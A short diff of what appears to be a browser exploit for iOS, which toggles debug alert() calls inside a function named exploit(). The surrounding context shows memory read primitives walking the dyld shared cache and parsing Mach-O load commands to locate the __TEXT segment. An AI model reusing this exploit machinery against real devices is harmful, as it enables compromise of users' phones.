@@ -533,6 +533,7 @@ function exploit(){
         }
 
         var stab = null;
+        alert("here");
         var ncmds = memory.u32(Add(base, 0x10));
         for(var i = 0, off = 0x20; i < ncmds; ++i)
         {
@@ -728,16 +729,16 @@ function exploit(){
             }
                 return memory.read(Add(straddr, i), 1)[0];
             };
-            alert(ab2str(fn(i,0)))
+           // alert(ab2str(fn(i,0)))
             var base = Add(memory.readInt64(Add(imgs, i * 0x20 + 0x10)), cache_slide);
            // alert(base + "vs" + memory.u32(Add(imgs,i * 0x20 + 0x10)))
             if(opcode_libs.some(lib => strcmp(fn, lib)))
             {
-               alert("here1")
+               //alert("here1")
                 var ncmds = memory.u32(Add(base, 0x10));
                 for(var j = 0, off = 0x20; j < ncmds; ++j)
                 {
-                 alert("here")
+                // alert("here")
                     var cmd = memory.u32(Add(base, off));
                     if(cmd == 0x19 && strcmp(memory.read(Add(base, off + 0x10), 0x10), "__TEXT")) // LC_SEGMENT_64
                     {
@@ -756,7 +757,7 @@ function exploit(){
 
                                 var addr = Add(memory.readInt64(Add(base, o + 0x20)), cache_slide)
                                 var size = memory.u32(Add(base, o + 0x28))
-                                alert("here")
+                                //alert("here")
                                 // Copy the entire __text region into a Uint32Array for faster processing.
                                 // Previously you could map a Uint32Array over the data, but on i7+ devices
                                 // this caused access violations.
